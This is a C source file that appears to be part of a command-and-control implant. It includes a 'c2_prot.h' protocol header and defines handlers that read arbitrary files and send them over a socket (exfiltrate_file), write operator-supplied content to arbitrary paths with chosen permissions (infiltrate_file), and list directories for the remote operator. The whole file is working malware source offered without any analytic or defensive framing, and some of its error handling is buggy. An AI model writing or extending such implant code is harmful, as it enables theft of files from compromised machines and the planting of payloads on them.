#include <sys/stat.h>
#include <sys/types.h>
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <stdio.h>
#include <string.h>
#include <dirent.h>

#include "c2_prot.h"
#include "commands.h"

void exfiltrate_file(int sockfd, struct exf_req *req)
{
    struct exf_res *res;
    enum file_status status = GOOD;
    struct stat statbuf;
    size_t n;
    off_t file_size = 0;
    int fd = -1;

    printf("File path: %s\n", req->path);

    if ((fd = open(req->path, O_RDONLY)) < 0)
    {
        perror("Error opening file");
        status = OPEN_ERROR;
        goto finish;
    }

    if (fstat(fd, &statbuf) < 0)
    {
        perror("Error on fstat");
        status = STAT_ERROR;
        goto finish;
    }

    file_size = statbuf.st_size;
    printf("File size: %d\n", file_size);

finish:
    res = exf_res_init(file_size, status);

    printf("Response length: %u\n", res->header.res_len);

    if (status != GOOD)
        goto out;

    if ((n = read(fd, res->content, res->content_len)) != res->content_len)
    {
        perror("Failed to read from file");
        res->status = READ_ERROR;
        if (n < 0)
            n = 0;
        res->header.res_len -= res->content_len - n;
    }

out:
    write(sockfd, res, res->header.res_len);

    if (fd > 0)
        close(fd);

    free(res);
    res = NULL;
}

void infiltrate_file(int sockfd, struct inf_req *req)
{
    struct inf_res *res;
    enum file_status status = GOOD;
    char *path;
    char *content;
    int fd = -1;

    path = (char *)malloc(req->path_len);
    memset(path, 0, req->path_len);
    memcpy(path, req->data, req->path_len);

    content = (char *)malloc(req->content_len);
    memset(content, 0, req->content_len);
    memcpy(content, req->data + req->path_len, req->content_len);

    printf("File path: %s\n", req->data);
    printf("File size: %u\n", req->content_len);

    if ((fd = open(path, O_WRONLY | O_CREAT, req->perm)) < 0)
    {
        perror("Error opening file");
        status = OPEN_ERROR;
        goto finish;
    }

    if (write(fd, content, req->content_len) < 0)
    {
        perror("Error writing to file");
        status = WRITE_ERROR;
    }

finish:
    res = inf_res_init(status);

    printf("Response length: %u\n", res->header.res_len);

out:
    write(sockfd, res, res->header.res_len);

    if (fd < 0)
        close(fd);

    free(path);
    free(content);
    free(res);
    res = NULL;
}

void read_directory(int sockfd, struct dir_req *req)
{
    struct dir_res *res;
    DIR *dirp = NULL;
    enum file_status status = GOOD;
    struct dirent *dent;
    struct stat statbuf;
    int dirent_count;
    size_t filename_len = 0;
    void *end_value = NULL;
    int fd = -1;

    printf("Directory path: %s\n", req->path);

    if (stat(req->path, &statbuf) < 0)
    {
        perror("Error on stat");
        status = STAT_ERROR;
        goto finish;
    }

    if (!S_ISDIR(statbuf.st_mode))
    {
        perror("Not a directory");
        status = NOT_DIRECTORY;
        goto finish;
    }

    if (!(dirp = opendir(req->path)))
    {
        perror("Error in opendir");
        status = OPEN_ERROR;
        goto finish;
    }

finish:
    res = dir_res_init(status);

    write(sockfd, res, sizeof(struct dir_res));

    if (status != GOOD)
        goto out;

    while (dent = readdir(dirp))
    {
        puts(dent->d_name);
        filename_len = strlen(dent->d_name);
        write(sockfd, &filename_len, sizeof(size_t));
        write(sockfd, dent->d_name, filename_len);
    }

    write(sockfd, &end_value, sizeof(void *));

    closedir(dirp);

out:
    free(res);
}
